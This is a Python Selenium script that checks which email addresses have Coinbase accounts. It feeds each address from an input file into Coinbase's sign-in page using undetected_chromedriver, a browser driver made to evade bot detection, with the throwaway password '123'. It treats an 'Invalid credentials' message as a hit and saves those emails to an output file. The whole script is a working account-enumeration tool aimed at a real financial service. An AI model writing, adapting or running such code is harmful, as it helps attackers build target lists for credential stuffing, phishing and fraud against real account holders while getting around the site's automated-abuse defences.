

import time

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from src.utilities.select_message_for_sending import read_file_line_by_line, update_file

url_input = "./assets/input.txt"
url_output = "./assets/output.txt"

def main():
    inputs = read_file_line_by_line(url_input)
    num_inputs = len(inputs)
    for i in range(0, num_inputs):
        email = inputs[i].strip()
        password = "123"
        print(email)
        from undetected_chromedriver import Chrome, ChromeOptions
        chrome_options = ChromeOptions()
        chrome_options.add_argument('--log-level=3')
        chrome_options.add_argument("--log-level=OFF")
        chrome_options.set_capability("goog:loggingPrefs", {'performance': 'ALL'})
        driver = Chrome(options=chrome_options)
        driver.get("https://www.coinbase.com/signin")
        try:
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//input[@aria-label='Email']")))
            email_input = driver.find_element(by=By.XPATH, value="//input[@aria-label='Email']")
            submit = driver.find_element(by=By.XPATH, value="//button[@type='submit']")
            email_input.send_keys(email)
            submit.click()
            time.sleep(1)
            try:
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//input[@aria-label='Password']")))
                password_input = driver.find_element(by=By.XPATH, value="//input[@aria-label='Password']")
                submit = driver.find_element(by=By.XPATH, value="//button[@type='submit']")
                password_input.send_keys(password)
                submit.click()
                try:
                    WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "//span[@aria-label='Invalid credentials']")))
                    print(email + " is valid")
                    with open(url_output, "a", encoding="utf8") as f:
                        f.write('"' + email + '",\n')
                except:
                    print(email + " is not valide")
                    pass
            except:
                pass
        except:
            pass
        update_file(url_input, 1)
        driver.close()


if __name__ == "__main__":
    main()